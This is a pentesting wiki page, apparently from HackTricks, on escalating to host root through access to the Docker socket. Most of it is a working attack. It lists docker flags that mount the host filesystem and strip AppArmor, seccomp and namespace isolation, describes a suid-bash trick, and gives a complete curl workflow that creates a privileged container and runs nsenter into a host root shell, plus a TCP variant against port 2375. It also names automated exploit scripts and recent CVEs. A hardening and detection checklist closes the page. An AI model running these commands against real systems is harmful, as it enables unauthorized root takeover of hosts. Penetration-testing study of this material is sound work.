# Abusing Docker Socket for Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

There are some occasions were you just have **access to the docker socket** and you want to use it to **escalate privileges**. Some actions might be very suspicious and you may want to avoid them, so here you can find different flags that can be useful to escalate privileges:

### Via mount

You can **mount** different parts of the **filesystem** in a container running as root and **access** them.\
You could also **abuse a mount to escalate privileges** inside the container.

- **`-v /:/host`** -> Mount the host filesystem in the container so you can **read the host filesystem.**
  - If you want to **feel like you are in the host** but being on the container you could disable other defense mechanisms using flags like:
    - `--privileged`
    - `--cap-add=ALL`
    - `--security-opt apparmor=unconfined`
    - `--security-opt seccomp=unconfined`
    - `-security-opt label:disable`
    - `--pid=host`
    - `--userns=host`
    - `--uts=host`
    - `--cgroupns=host`
- **`--device=/dev/sda1 --cap-add=SYS_ADMIN --security-opt apparmor=unconfined`** -> This is similar to the previous method, but here we are **mounting the device disk**. Then, inside the container run `mount /dev/sda1 /mnt` and you can **access** the **host filesystem** in `/mnt`
  - Run `fdisk -l` in the host to find the `</dev/sda1>` device to mount
- **`-v /tmp:/host`** -> If for some reason you can **just mount some directory** from the host and you have access inside the host. Mount it and create a **`/bin/bash`** with **suid** in the mounted directory so you can **execute it from the host and escalate to root**.

> [!TIP]
> Note that maybe you cannot mount the folder `/tmp` but you can mount a **different writable folder**. You can find writable directories using: `find / -writable -type d 2>/dev/null`
>
> **Note that not all the directories in a linux machine will support the suid bit!** In order to check which directories support the suid bit run `mount | grep -v "nosuid"` For example usually `/dev/shm` , `/run` , `/proc` , `/sys/fs/cgroup` and `/var/lib/lxcfs` don't support the suid bit.
>
> Note also that if you can **mount `/etc`** or any other folder **containing configuration files**, you may change them from the docker container as root in order to **abuse them in the host** and escalate privileges (maybe modifying `/etc/shadow`)

### Escaping from the container

- **`--privileged`** -> With this flag you [remove all the isolation from the container](docker-privileged.md#what-affects). Check techniques to [escape from privileged containers as root](docker-breakout-privilege-escalation/index.html#automatic-enumeration-and-escape).
- **`--cap-add=<CAPABILITY/ALL> [--security-opt apparmor=unconfined] [--security-opt seccomp=unconfined] [-security-opt label:disable]`** -> To [escalate abusing capabilities](../linux-capabilities.md), **grant that capability to the container** and disable other protection methods that may prevent the exploit to work.

### Curl & Docker HTTP API (Unix-socket)

The Docker Engine exposes a **REST-like HTTP API** over a Unix socket located at `/var/run/docker.sock` (TCP 2375/2376 if daemon is configured that way).  If an attacker can read **and** write to that socket they can impersonate the daemon itself and perform *any* operation, including starting privileged containers that mount the host file-system.

Below is a minimal end-to-end exploitation workflow that keeps all activity inside the HTTP API – no `docker` CLI required.  The same technique works from **inside another container** (mount `/var/run/docker.sock`) or from the host if your user is in the `docker` group.

```bash
# List existing containers
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# 1. Create a new container that:
#    • uses a tiny image (alpine)
#    • mounts the host FS read-write under /host
#    • runs with PID, UTS, NET & user namespaces of the host (true breakout)
cat > /tmp/payload.json <<'EOF'
{
  "Image": "alpine:3.20",
  "Cmd": ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "chroot", "/host", "/bin/sh"],
  "HostConfig": {
    "Binds": ["/:/host:rshared"],
    "Privileged": true,
    "PidMode": "host",
    "UsernsMode": "host",
    "NetworkMode": "host"
  }
}
EOF

# 2. Ask the daemon to create and start the container
CID=$(curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d @/tmp/payload.json \
        -X POST http://localhost/containers/create | jq -r .Id)

curl --unix-socket /var/run/docker.sock -X POST \
     http://localhost/containers/${CID}/start

# 3. Attach (gain a host root shell)
docker exec -it ${CID} /bin/sh
```

The same payload can be sent over TCP if `-H "Host:"` is set and TLS is disabled on port **2375**:

```bash
curl -X POST http://<daemon-ip>:2375/containers/create -d @payload.json -H 'Content-Type: application/json'
```

> [!NOTE]
> Since Docker **19.03** the API is versioned.  `/v1.44/containers/create` works on modern daemons; the un-versioned path shown above is still handled for backwards compatibility.

---

### Automated exploitation helpers

| Tool | Year | Purpose | Example |
|------|------|---------|---------|
| **dockersock-pwn** | 2024 | Python script that discovers a writable socket, generates the JSON payload and spawns a fully-privileged container automatically | `python3 dockersock_pwn.py -icmd="whoami && hostname"` |
| **p0ck3t-d0ck3r (PoC)** | 2023 | Single-file Bash PoC used in several CTFs to break out of containers by abusing the socket | `./p0ck3t-d0ck3r.sh -m /etc:/mnt --uid 0` |

Both utilities work purely over the HTTP API and don’t need the Docker CLI or root on the attacking side.

---

### Recent vulnerabilities that reduce the barrier even further (2023-2025)

* **CVE-2024-41110** – *Authorization-plugin bypass via empty `Content-Length` header*:  When an auth-plugin is enabled, an attacker with *local* write access to the socket can send a **`Content-Length: 0`** header to trick the daemon into treating the request as `GET`, effectively *skipping authorization* and enabling full control.  Fixed in Docker Engine **25.0.5**.
* **CVE-2023-0629** – *Docker Desktop Raw-socket privilege escalation*:  On macOS/Windows the `docker.raw.sock` is world-writable inside the VM.  A low-privileged user can talk to the daemon from the host OS and start a privileged container in the Linux VM, allowing follow-up escapes to the host.  Patched in **4.17.0**.

> Keep in mind that **read-only** access is usually enough to learn the API version and the system’s image list, which in turn helps crafting working exploits – so restrict both read **and** write.  See also *Leaky Vessels* (CVE-2024-21626) where a malicious container abuses `docker cp` once it has limited socket access.

---

### Detection & Hardening checklist

* **Never mount** `/var/run/docker.sock` into containers that you do not fully trust.  Use dedicated sidecar APIs (e.g. *docker-proxy* or *socat* in read-only mode) if you only need monitoring information.
* Run **rootless-docker** or enable **user-namespace remapping (`--userns-remap=default`)** – even if the socket is compromised, the daemon will operate as an unprivileged UID on the host.
* On production servers:
  * Remove users from the **`docker` group** (use `sudo`) and set `0660` permissions on the socket.
  * Enable the official **`authorization-plugin`** (RBAC) *and keep your engine patched* (see CVE-2024-41110).
  * Enforce **AppArmor/SELinux** profiles that deny mounting sensitive paths.
* Log and audit:
  * `auditctl -w /var/run/docker.sock -p rwxa -k docker-sock` to catch suspicious writes.
  * Enable **dockerd `--log-level=debug`** and ship JSON logs to a SIEM for anomaly detection.

## References

- [Aqua Security – CVE-2024-41110 deep dive](https://blog.aquasec.com/cve-2024-41110-docker-authorization-bypass)
- [Docker Desktop release notes 4.17 – CVE-2023-0629 fix](https://docs.docker.com/desktop/release-notes/)

{{#include ../../../banners/hacktricks-training.md}}


